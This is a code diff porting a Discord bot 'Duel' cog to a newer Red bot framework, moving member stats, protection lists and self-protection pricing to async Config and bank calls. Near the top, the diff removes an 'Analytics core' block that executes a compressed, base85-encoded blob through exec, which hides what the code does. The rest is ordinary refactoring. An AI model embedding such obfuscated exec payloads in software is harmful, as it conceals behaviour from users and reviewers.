@@ -5,59 +5,22 @@
 
 import asyncio
 import discord
-from discord.ext import commands
 from functools import partial
 import math
 import os
 import random
 
-from .utils import checks
-from .utils.dataIO import dataIO
-from .utils.chat_formatting import error, escape_mass_mentions, pagify, warning
-
-# Analytics core
-import zlib, base64
-exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
-dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
-9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
-d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
-gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
-7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
-R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
-TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
-|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
-O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
-8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
-I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
-u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
-J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
-vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
-?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
-}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
-#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
-Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
-IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
-G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
-2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
-p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
-gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
-KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
-Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
-FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
-# End analytics core
+from redbot.core import checks, commands, Config, bank
+from redbot.core.utils.chat_formatting import error, pagify, warning
 
 __version__ = '1.6.0'
 
 
 # Constants
-MAX_ROUNDS = 4
+MAX_ROUNDS = 10
 INITIAL_HP = 20
 TARGET_SELF = 'self'
 TARGET_OTHER = 'target'
-
-DATA_PATH = "data/duel/"
-JSON_PATH = DATA_PATH + "duelist.json"
-
 
 def indicatize(d):
     result = {}
@@ -277,112 +240,92 @@ class Player:
         return self.member.display_name
 
     # helpers for stat functions
-    def _set_stat(self, stat, num):
-        stats = self.cog._get_stats(self)
-        if not stats:
-            stats = {'wins': 0, 'losses': 0, 'draws': 0}
+    async def _set_stat(self, stat, num):
+        stats = await self.cog._get_stats(self)
         stats[stat] = num
-        return self.cog._set_stats(self, stats)
+        await self.cog._set_stats(self, stats)
 
-    def _get_stat(self, stat):
-        stats = self.cog._get_stats(self)
-        return stats[stat] if stats and stat in stats else 0
+    async def _get_stat(self, stat):
+        stats = await self.cog._get_stats(self)
+        return stats[stat]
 
-    def get_state(self):
-        return {k: self._get_stat(k) for k in ('wins', 'losses', 'draws')}
+    async def get_wins(self):
+        return await self._get_stat('wins')
 
-    # Race-safe, directly usable properties
-    @property
-    def wins(self):
-        return self._get_stat('wins')
+    async def set_wins(self, num):
+        await self._set_stat('wins', num)
 
-    @wins.setter
-    def wins(self, num):
-        self._set_stat('wins', num)
+    async def get_losses(self):
+        return await self._get_stat('losses')
 
-    @property
-    def losses(self):
-        return self._get_stat('losses')
+    async def set_losses(self, num):
+        await self._set_stat('losses', num)
 
-    @losses.setter
-    def losses(self, num):
-        self._set_stat('losses', num)
+    async def get_draws(self):
+        return await self._get_stat('draws')
 
-    @property
-    def draws(self):
-        return self._get_stat('draws')
-
-    @draws.setter
-    def draws(self, num):
-        self._set_stat('draws', num)
+    async def set_draws(self, num):
+        await self._set_stat('draws', num)
 
 
-class Duel:
-    def __init__(self, bot):
-        self.bot = bot
-        self.duelists = dataIO.load_json(JSON_PATH)
+class Duel(commands.Cog):
+    def __init__(self):
         self.underway = set()
+        self.config = Config.get_conf(self, identifier=134621854878007297)
+        default_member_config = {
+            'wins': 0,
+            'losses': 0,
+            'draws': 0
+        }
+        default_guild_config = {
+            'protected': [],
+            'self_protect': False,
+            'edit_posts': False
+        }
+        self.config.register_member(**default_member_config)
+        self.config.register_guild(**default_guild_config)
 
-        try:
-            self.analytics = CogAnalytics(self)
-        except Exception as e:
-            self.bot.logger.exception(e)
-            self.analytics = None
+    async def _set_stats(self, user, stats):
+        await self.config.member(user.member).set(stats)
 
-    def _set_stats(self, user, stats):
-        userid = user.member.id
-        serverid = user.member.server.id
-
-        if serverid not in self.duelists:
-            self.duelists[serverid] = {}
-
-        self.duelists[serverid][userid] = stats
-        dataIO.save_json(JSON_PATH, self.duelists)
-
-    def _get_stats(self, user):
-        userid = user.member.id
-        serverid = user.member.server.id
-        if serverid not in self.duelists or userid not in self.duelists[serverid]:
-            return None
-
-        return self.duelists[serverid][userid]
+    async def _get_stats(self, user):
+        return await self.config.member(user.member).all()
 
     def get_player(self, user: discord.Member):
         return Player(self, user)
 
-    def get_all_players(self, server: discord.Server):
+    def get_all_players(self, server: discord.Guild):
         return [self.get_player(m) for m in server.members]
 
     def format_display(self, server, id):
         if id.startswith('r'):
-            role = discord.utils.get(server.roles, id=id[1:])
+            role = discord.utils.get(server.roles, id=int(id[1:]))
 
             if role:
                 return '@%s' % role.name
             else:
                 return 'deleted role #%s' % id
         else:
-            member = server.get_member(id)
+            member = server.get_member(int(id))
 
             if member:
                 return member.display_name
             else:
                 return 'missing member #%s' % id
 
-    def is_protected(self, member: discord.Member, member_only=False) -> bool:
-        sid = member.server.id
-        protected = set(self.duelists.get(sid, {}).get('protected', []))
-        roles = set() if member_only else set('r' + r.id for r in member.roles)
-        return member.id in protected or bool(protected & roles)
+    async def is_protected(self, member: discord.Member, member_only=False) -> bool:
+        protected = set(await self.config.guild(member.guild).protected())
+        roles = set() if member_only else set('r' + str(r.id) for r in member.roles)
+        return str(member.id) in protected or bool(protected & roles)
 
-    def protect_common(self, obj, protect=True):
+    async def protect_common(self, obj, protect=True):
         if not isinstance(obj, (discord.Member, discord.Role)):
             raise TypeError('Can only pass member or role objects.')
 
-        server = obj.server
-        id = ('r' if type(obj) is discord.Role else '') + obj.id
+        server = obj.guild
+        id = ('r' if type(obj) is discord.Role else '') + str(obj.id)
 
-        protected = self.duelists.get(server.id, {}).get("protected", [])
+        protected = await self.config.guild(server).protected()
 
         if protect == (id in protected):
             return False
@@ -391,71 +334,62 @@ class Duel:
         else:
             protected.remove(id)
 
-        if server.id not in self.duelists:
-            self.duelists[server.id] = {}
-
-        self.duelists[server.id]['protected'] = protected
-        dataIO.save_json(JSON_PATH, self.duelists)
+        await self.config.guild(server).protected.set(protected)
         return True
 
-    @commands.group(name="protect", invoke_without_command=True, no_pm=True, pass_context=True)
-    async def _protect(self, ctx, user: discord.Member):
+    @commands.guild_only()
+    @commands.group(name="protect", invoke_without_command=True)
+    async def _protect(self, ctx, user: discord.Member = None):
         """
         Manage the protection list (adds items)
         """
-        if ctx.invoked_subcommand is None:
-            await ctx.invoke(self._protect_user, user)
 
-    @_protect.command(name="me", pass_context=True)
+        if ctx.invoked_subcommand is None and user is not None:
+            await ctx.invoke(self._protect_user, user)
+            return
+
+        await ctx.send_help()
+
+    @_protect.command(name="me")
     async def _protect_self(self, ctx):
         """
         Adds you to the duel protection list
         """
-        sid = ctx.message.server.id
-        self_protect = self.duelists.get(sid, {}).get('self_protect', False)
+        server = ctx.message.guild
+        self_protect = await self.config.guild(server).self_protect()
         author = ctx.message.author
 
-        if self.is_protected(author, member_only=True):
-            await self.bot.say("You're already in the protection list.")
+        if await self.is_protected(author, member_only=True):
+            await ctx.send("You're already in the protection list.")
             return
         elif self_protect is False:
-            await self.bot.say('Sorry, self-protection is currently disabled.')
+            await ctx.send('Sorry, self-protection is currently disabled.')
             return
         elif type(self_protect) is int:
-            economy = self.bot.get_cog('Economy')
-
-            if not economy:
-                await self.bot.say(warning('The economy cog is not loaded.'))
-                return
-            elif not economy.bank.account_exists(author):
-                await self.bot.say(warning("You don't have a bank account yet."))
-                return
-            elif not economy.bank.can_spend(author, self_protect):
-                await self.bot.say("You don't have %i credits to spend." % self_protect)
+            if not await bank.can_spend(author, self_protect):
+                await ctx.send("You don't have %i credits to spend." % self_protect)
                 return
 
             try:
-                economy.bank.withdraw_credits(author, self_protect)
-            except Exception as e:
-                self.bot.logger.exception(e)
-                await self.bot.say(error("Transaction failed. Bot owner: check the logs."))
+                await bank.withdraw_credits(author, self_protect)
+            except Exception:
+                await ctx.send(error("Transaction failed. Report to bot owner!"))
                 return
 
-        if self.protect_common(ctx.message.author, True):
-            await self.bot.say("You have been successfully added to the protection list.")
+        if await self.protect_common(author, True):
+            await ctx.send("You have been successfully added to the protection list.")
         else:
-            await self.bot.say("Something went wrong adding you to the protection list.")
+            await ctx.send("Something went wrong adding you to the protection list.")
 
     @checks.admin_or_permissions(administrator=True)
-    @_protect.command(name="price", pass_context=True)
+    @_protect.command(name="price")
     async def _protect_price(self, ctx, param: str = None):
         """
         Enable, disable, or set the price of self-protection
 
         Valid options: "disable", "free", or any number 0 or greater.
         """
-        sid = ctx.message.server.id
-        current = self.duelists.get(sid, {}).get('self_protect', False)
+        current = await self.config.guild(ctx.message.guild).self_protect()
 
         if param:
             param = param.lower().strip(' "`')
@@ -467,7 +401,7 @@ class Duel:
             elif param.isdecimal():
                 param = int(param)
             else:
-                await self.bot.send_cmd_help(ctx)
+                await ctx.send_help()
                 return
 
         if param is None:
@@ -478,12 +412,7 @@ class Duel:
         else:
             adj = 'now'
 
-            if sid not in self.duelists:
-                self.duelists[sid] = {'self_protect': param}
-            else:
-                self.duelists[sid]['self_protect'] = param
-
-            dataIO.save_json(JSON_PATH, self.duelists)
+            await self.config.guild(ctx.message.guild).self_protect.set(param)
 
         if param is False:
             disp = 'disabled'
@@ -495,72 +424,72 @@ class Duel:
             raise RuntimeError('unhandled param value, please report this bug!')
 
         msg = 'Self-protection is %s %s.' % (adj, disp)
-        economy = self.bot.get_cog('Economy')
 
-        if type(param) is int and not economy:
-            msg += '\n\n' + warning('NOTE: the economy cog is not loaded. Members '
-                                    'will not be able to purchase protection.')
-
-        await self.bot.say(msg)
+        await ctx.send(msg)
 
     @checks.mod_or_permissions(administrator=True)
-    @_protect.command(name="user", pass_context=True)
+    @_protect.command(name="user")
     async def _protect_user(self, ctx, user: discord.Member):
         """Adds a member to the protection list"""
-        if self.protect_common(user, True):
-            await self.bot.say("%s has been successfully added to the protection list." % user.display_name)
+        if await self.protect_common(user, True):
+            await ctx.send("%s has been successfully added to the protection list." % user.display_name)
         else:
-            await self.bot.say("%s is already in the protection list." % user.display_name)
+            await ctx.send("%s is already in the protection list." % user.display_name)
 
     @checks.admin_or_permissions(administrator=True)
-    @_protect.command(name="role", pass_context=True)
+    @_protect.command(name="role")
     async def _protect_role(self, ctx, role: discord.Role):
         """Adds a role to the protection list"""
-        if self.protect_common(role, True):
-            await self.bot.say("The %s role has been successfully added to the protection list." % role.name)
+        if await self.protect_common(role, True):
+            await ctx.send("The %s role has been successfully added to the protection list." % role.name)
         else:
-            await self.bot.say("The %s role is already in the protection list." % role.name)
+            await ctx.send("The %s role is already in the protection list." % role.name)
 
-    @commands.group(name="unprotect", invoke_without_command=True, no_pm=True, pass_context=True)
-    async def _unprotect(self, ctx, user: discord.Member):
+    @commands.guild_only()
+    @commands.group(name="unprotect", invoke_without_command=True)
+    async def _unprotect(self, ctx, user: discord.Member = None):
         """
         Manage the protection list (removes items)
         """
-        if ctx.invoked_subcommand is None:
+        if ctx.invoked_subcommand is None and user is not None:
             await ctx.invoke(self._unprotect_user, user)
+            return
+
+        await ctx.send_help()
 
     @checks.mod_or_permissions(administrator=True)
-    @_unprotect.command(name="user", pass_context=True)
+    @_unprotect.command(name="user")
     async def _unprotect_user(self, ctx, user: discord.Member):
         """Removes a member from the duel protection list"""
-        if self.protect_common(user, False):
-            await self.bot.say("%s has been successfully removed from the protection list." % user.display_name)
+        if await self.protect_common(user, False):
+            await ctx.send("%s has been successfully removed from the protection list." % user.display_name)
         else:
-            await self.bot.say("%s is not in the protection list." % user.display_name)
+            await ctx.send("%s is not in the protection list." % user.display_name)
 
     @checks.admin_or_permissions(administrator=True)
-    @_unprotect.command(name="role", pass_context=True)
+    @_unprotect.command(name="role")
     async def _unprotect_role(self, ctx, role: discord.Role):
         """Removes a role from the duel protection list"""
-        if self.protect_common(role, False):
-            await self.bot.say("The %s role has been successfully removed from the protection list." % role.name)
+        if await self.protect_common(role, False):
+            await ctx.send("The %s role has been successfully removed from the protection list." % role.name)
         else:
-            await self.bot.say("The %s role is not in the protection list." % role.name)
+            await ctx.send("The %s role is not in the protection list." % role.name)
 
-    @_unprotect.command(name="me", pass_context=True)
+    @_unprotect.command(name="me")
     async def _unprotect_self(self, ctx):
         """Removes you from the duel protection list"""
-        if self.protect_common(ctx.message.author, False):
-            await self.bot.say("You have been removed from the protection list.")
+        if await self.protect_common(ctx.message.author, False):
+            await ctx.send("You have been removed from the protection list.")
         else:
-            await self.bot.say("You aren't in the protection list.")
+            await ctx.send("You aren't in the protection list.")
 
-    @commands.command(name="protected", pass_context=True, aliases=['protection'])
+    @commands.guild_only()
+    @commands.command(name="protected", aliases=['protection'])
     async def _protection(self, ctx):
         """Displays the duel protection list"""
-        server = ctx.message.server
-        duelists = self.duelists.get(server.id, {})
-        member_list = duelists.get("protected", [])
+        server = ctx.message.guild
+        duelists = await self.config.guild(server).all()
+        member_list = duelists["protected"]
         fmt = partial(self.format_display, server)
 
         if member_list:
@@ -568,150 +497,137 @@ class Duel:
             name_list = ["**Protected users and roles:**"] + sorted(name_list)
             delim = '\n'
 
-            for page in pagify(delim.join(name_list), delims=[delim]):
-                await self.bot.say(escape_mass_mentions(page))
+            for page in pagify(delim.join(name_list), delims=[delim], escape_mass_mentions=True):
+                await ctx.send(page)
         else:
-            await self.bot.say("The list is currently empty, add users or roles with `%sprotect` first." % ctx.prefix)
+            await ctx.send("The list is currently empty, add users or roles with `%sprotect` first." % ctx.prefix)
 
-    @commands.group(name="duels", pass_context=True, allow_dms=False)
+    @commands.guild_only()
+    @commands.group(name="duels", invoke_without_command=True)
     async def _duels(self, ctx):
         if ctx.invoked_subcommand is None:
             await ctx.invoke(self._duels_list)
 
-    @_duels.command(name="list", pass_context=True)
-    @commands.cooldown(2, 60, commands.BucketType.user)
+    @_duels.command(name="list")
+    @commands.cooldown(2, 60, discord.ext.commands.BucketType.user)
     async def _duels_list(self, ctx, top: int = 10):
         """Shows the duel leaderboard, defaults to top 10"""
-        server = ctx.message.server
-        server_members = {m.id for m in server.members}
+        server = ctx.message.guild
+        all_stats = await self.config.all_members(server)
 
         if top < 1:
             top = 10
 
-        if server.id in self.duelists:
-            def sort_wins(kv):
-                _, v = kv
-                return v['wins'] - v['losses']
+        def sort_wins(kv):
+            _, v = kv
+            return v['wins'] - v['losses']
 
-            def stat_filter(kv):
-                uid, stats = kv
+        def stat_filter(kv):
+            _, stats = kv
 
-                if type(stats) is not dict or uid not in server_members:
-                    return False
+            if type(stats) is not dict:
+                return False
 
-                return True
+            if stats['wins'] == 0 and stats['losses'] == 0 and stats['draws'] == 0:
+                return False
 
-            # filter out extra data, TODO: store protected list seperately
-            duel_stats = filter(stat_filter, self.duelists[server.id].items())
-            duels_sorted = sorted(duel_stats, key=sort_wins, reverse=True)
+            return True
 
-            if not duels_sorted:
-                await self.bot.say('No records to show.')
-                return
+        # filter out extra data, TODO: store protected list seperately
+        duel_stats = filter(stat_filter, all_stats.items())
+        duels_sorted = sorted(duel_stats, key=sort_wins, reverse=True)
 
-            if len(duels_sorted) < top:
-                top = len(duels_sorted)
-
-            topten = duels_sorted[:top]
-            highscore = ""
-            place = 1
-            members = {uid: server.get_member(uid) for uid, _ in topten}  # only look up once each
-            names = {uid: m.nick if m.nick else m.name for uid, m in members.items()}
-            max_name_len = max([len(n) for n in names.values()])
-
-            # header
-            highscore += '#'.ljust(len(str(top)) + 1)  # pad to digits in longest number
-            highscore += 'Name'.ljust(max_name_len + 4)
-
-            for stat in ['wins', 'losses', 'draws']:
-                highscore += stat.ljust(8)
-
-            highscore += '\n'
-
-            for uid, stats in topten:
-                highscore += str(place).ljust(len(str(top)) + 1)  # pad to digits in longest number
-                highscore += names[uid].ljust(max_name_len + 4)
-
-                for stat in ['wins', 'losses', 'draws']:
-                    val = stats[stat]
-                    highscore += '{}'.format(val).ljust(8)
-
-                highscore += "\n"
-                place += 1
-            if highscore:
-                if len(highscore) < 1985:
-                    await self.bot.say("```py\n" + highscore + "```")
-                else:
-                    await self.bot.say("The leaderboard is too big to be displayed. Try with a lower <top> parameter.")
-        else:
-            await self.bot.say("There are no scores registered in this server. Start fighting!")
-
-    @checks.admin_or_permissions(administrator=True)
-    @_duels.command(name="reset", pass_context=True)
-    async def _duels_reset(self, ctx):
-        "Clears duel scores without resetting protection or editmode."
-        keep_keys = {'protected', 'edit_posts', 'self_protect'}
-        sid = ctx.message.server.id
-        data = self.duelists.get(sid, {})
-        dks = set(data.keys())
-
-        if dks <= keep_keys:
-            await self.bot.say('Nothing to reset.')
+        if not duels_sorted:
+            await ctx.send('No records to show.')
             return
 
-        keep_data = {k: data[k] for k in keep_keys & dks}
-        self.duelists[sid] = keep_data
-        dataIO.save_json(JSON_PATH, self.duelists)
-        await self.bot.say('Duel records cleared.')
+        if len(duels_sorted) < top:
+            top = len(duels_sorted)
+
+        topten = duels_sorted[:top]
+        highscore = ""
+        place = 1
+        members = {uid: server.get_member(uid) for uid, _ in topten}  # only look up once each
+        names = {uid: m.display_name for uid, m in members.items()}
+        max_name_len = max([len(n) for n in names.values()])
+
+        # header
+        highscore += '#'.ljust(len(str(top)) + 1)  # pad to digits in longest number
+        highscore += 'Name'.ljust(max_name_len + 4)
+
+        for stat in ['wins', 'losses', 'draws']:
+            highscore += stat.ljust(8)
+
+        highscore += '\n'
+
+        for uid, stats in topten:
+            highscore += str(place).ljust(len(str(top)) + 1)  # pad to digits in longest number
+            highscore += names[uid].ljust(max_name_len + 4)
+
+            for stat in ['wins', 'losses', 'draws']:
+                val = stats[stat]
+                highscore += '{}'.format(val).ljust(8)
+
+            highscore += "\n"
+            place += 1
+
+        if len(highscore) < 1985:
+            await ctx.send("```py\n" + highscore + "```")
+        else:
+            await ctx.send("The leaderboard is too big to be displayed. Try with a lower <top> parameter.")
 
     @checks.admin_or_permissions(administrator=True)
-    @_duels.command(name="editmode", pass_context=True)
+    @_duels.command(name="reset")
+    async def _duels_reset(self, ctx):
+        "Clears duel scores without resetting protection or editmode."
+
+        await self.config.clear_all_members(ctx.guild)
+        await ctx.send('Duel records cleared.')
+
+    @checks.admin_or_permissions(administrator=True)
+    @_duels.command(name="editmode")
     async def _duels_postmode(self, ctx, on_off: bool = None):
         "Edits messages in-place instead of posting each move seperately."
-        sid = ctx.message.server.id
-        current = self.duelists.get(sid, {}).get('edit_posts', False)
+        current = await self.config.guild(ctx.guild).edit_posts()
 
         if on_off is None:
             adj = 'enabled' if current else 'disabled'
-            await self.bot.say('In-place editing is currently %s.' % adj)
+            await ctx.send('In-place editing is currently %s.' % adj)
             return
 
         adj = 'enabled' if on_off else 'disabled'
         if on_off == current:
-            await self.bot.say('In-place editing already %s.' % adj)
-        else:
-            if sid not in self.duelists:
-                self.duelists[sid] = {}
+            await ctx.send('In-place editing already %s.' % adj)
+            return
 
-            self.duelists[sid]['edit_posts'] = on_off
-            await self.bot.say('In-place editing %s.' % adj)
+        await self.config.guild(ctx.guild).edit_posts.set(on_off)
+        await ctx.send('In-place editing %s.' % adj)
 
-        dataIO.save_json(JSON_PATH, self.duelists)
-
-    @commands.command(name="duel", pass_context=True, no_pm=True)
+    @commands.guild_only()
+    @commands.command(name="duel")
     @commands.cooldown(2, 60, commands.BucketType.user)
     async def _duel(self, ctx, user: discord.Member):
         """Duel another player"""
-        author = ctx.message.author
-        server = ctx.message.server
-        channel = ctx.message.channel
-        duelists = self.duelists.get(server.id, {})
+        author = ctx.author
+        server = ctx.guild
+        channel = ctx.channel
+        guild_config = await self.config.guild(server).all()
 
         abort = True
 
         if channel.id in self.underway:
-            await self.bot.say("There's already a duel underway in this channel!")
+            await ctx.send("There's already a duel underway in this channel!")
         elif user == author:
-            await self.bot.reply("you can't duel yourself, silly!")
-        elif self.is_protected(author):
-            await self.bot.reply("you can't duel anyone while you're on the protected users list.")
-        elif self.is_protected(user):
-            await self.bot.reply("%s is on the protected users list." % user.display_name)
+            await ctx.send("You can't duel yourself, silly!")
+        elif await self.is_protected(author):
+            await ctx.send("You can't duel anyone while you're on the protected users list.")
+        elif await self.is_protected(user):
+            await ctx.send("%s is on the protected users list." % user.display_name)
         else:
             abort = False
 
         if abort:
-            bucket = ctx.command._buckets.get_bucket(ctx)
+            bucket = ctx.command._buckets.get_bucket(ctx.message)
             bucket._tokens += 1  # Sorry, Danny
             return
 
@@ -720,13 +636,11 @@ class Duel:
         self.underway.add(channel.id)
 
         try:
-            self.bot.dispatch('duel', channel=channel, players=(p1, p2))
-
             order = [(p1, p2), (p2, p1)]
             random.shuffle(order)
             msg = ["%s challenges %s to a duel!" % (p1, p2)]
             msg.append("\nBy a coin toss, %s will go first." % order[0][0])
-            msg_object = await self.bot.say('\n'.join(msg))
+            msg_object = await ctx.send('\n'.join(msg))
             for i in range(MAX_ROUNDS):
                 if p1.hp <= 0 or p2.hp <= 0:
                     break
@@ -734,12 +648,12 @@ class Duel:
                     if p1.hp <= 0 or p2.hp <= 0:
                         break
 
-                    if attacker.member == ctx.message.server.me:
+                    if attacker.member == ctx.me:
                         move_msg = self.generate_action(attacker, defender, 'BOT')
                     else:
                         move_msg = self.generate_action(attacker, defender)
 
-                    if duelists.get('edit_posts', False):
+                    if guild_config['edit_posts']:
                         new_msg = '\n'.join(msg + [move_msg])
                         if len(new_msg) < 2000:
                             await self._robust_edit(msg_object, content=new_msg)
@@ -747,30 +661,32 @@ class Duel:
                             await asyncio.sleep(1)
                             continue
 
-                    msg_object = await self.bot.say(move_msg)
+                    msg_object = await ctx.send(move_msg)
                     msg = [move_msg]
                     await asyncio.sleep(1)
 
             if p1.hp != p2.hp:
                 victor = p1 if p1.hp > p2.hp else p2
                 loser = p1 if p1.hp < p2.hp else p2
-                victor.wins += 1
-                loser.losses += 1
+                victor_wins = await victor.get_wins()
+                loser_losses = await loser.get_losses()
+                await victor.set_wins(victor_wins + 1)
+                await loser.set_losses(loser_losses + 1)
                 msg = 'After {0} rounds, {1.mention} wins with {1.hp} HP!'.format(i + 1, victor)
                 msg += '\nStats: '
 
                 for p, end in ((victor, '; '), (loser, '.')):
-                    msg += '{0} has {0.wins} wins, {0.losses} losses, {0.draws} draws{1}'.format(p, end)
+                    msg += f'{p} has {await p.get_wins()} wins, {await p.get_losses()} losses, {await p.get_draws()} draws{end}'
             else:
                 victor = None
 
                 for p in [p1, p2]:
-                    p.draws += 1
+                    player_draws = await p.get_draws()
+                    await p.set_draws(player_draws + 1)
 
                 msg = 'After %d rounds, the duel ends in a tie!' % (i + 1)
 
-            await self.bot.say(msg)
-            self.bot.dispatch('duel_completion', channel=channel, players=(p1, p2), victor=victor)
+            await ctx.send(msg)
         except Exception:
             raise
         finally:
@@ -821,17 +737,11 @@ class Duel:
 
     async def _robust_edit(self, msg, content=None, embed=None):
         try:
-            msg = await self.bot.edit_message(msg, new_content=content, embed=embed)
+            await msg.edit(content=content, embed=embed)
         except discord.errors.NotFound:
-            msg = await self.bot.send_message(msg.channel, content=content, embed=embed)
+            await msg.channel.send(content=content, embed=embed)
         except Exception:
             raise
-
-        return msg
-
-    async def on_command(self, command, ctx):
-        if ctx.cog is self and self.analytics:
-            self.analytics.command(ctx)
 
 
 def weighted_choice(choices):
@@ -877,23 +787,3 @@ def dict_weight(d, top=True):
         return wd
     else:
         return wd, sw
-
-
-def check_folders():
-    if os.path.exists("data/duels/"):
-        os.rename("data/duels/", DATA_PATH)
-    if not os.path.exists(DATA_PATH):
-        print("Creating data/duel folder...")
-        os.mkdir(DATA_PATH)
-
-
-def check_files():
-    if not dataIO.is_valid_json(JSON_PATH):
-        print("Creating duelist.json...")
-        dataIO.save_json(JSON_PATH, {})
-
-
-def setup(bot):
-    check_folders()
-    check_files()
-    bot.add_cog(Duel(bot))
